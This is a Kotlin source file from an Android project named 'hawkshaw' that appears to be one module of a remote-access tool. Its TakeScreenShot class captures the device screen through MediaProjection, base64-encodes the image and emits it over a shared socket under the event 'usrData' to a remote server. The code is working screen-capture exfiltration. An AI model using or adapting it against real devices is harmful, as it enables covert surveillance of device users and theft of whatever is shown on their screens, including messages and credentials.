package me.hawkshaw.tasks

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.SystemClock
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import me.hawkshaw.utils.Constants
import org.json.JSONObject
import java.io.ByteArrayOutputStream


class TakeScreenShot(private val ctx: Context, private val handler: Handler, private val resultCode: Int, private val data: Intent?) : Thread() {


    private fun takeScreenShot() {

        SystemClock.sleep(1000)
        var flagScreenShot = true

        val metrics = DisplayMetrics()
        val windowManager = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val mgr = ctx.getSystemService(Activity.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

        windowManager.defaultDisplay.getMetrics(metrics)
        val mMediaProjection = mgr.getMediaProjection(resultCode, data)
        val imgReader: ImageReader = ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 1)


        val onImageAvailableListener = ImageReader.OnImageAvailableListener { it: ImageReader? ->

            val image: Image? = it?.acquireLatestImage()

            if (image != null && flagScreenShot) {

                flagScreenShot = false
                mMediaProjection.stop()
                imgReader.setOnImageAvailableListener(null, null)

                val mWidth = image.width
                val mHeight = image.height

                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * mWidth

                val bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(buffer)

                val obj = JSONObject()
                obj.put("name", System.currentTimeMillis())
                obj.put("image64", encodeImage(bitmap))
                obj.put("dataType", "downloadImage")

                Constants.socket?.emit("usrData", obj)

            }
            image?.close()
        }

        mMediaProjection.createVirtualDisplay("ScreenCapture", metrics.widthPixels, metrics.heightPixels,
                metrics.densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imgReader.surface, null, handler)

        imgReader.setOnImageAvailableListener(onImageAvailableListener, handler)
    }


    private fun encodeImage(bm: Bitmap): String {
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos)
        val b = baos.toByteArray()
        return Base64.encodeToString(b, Base64.DEFAULT)
    }

    override fun run() {
        super.run()
        takeScreenShot()
    }
}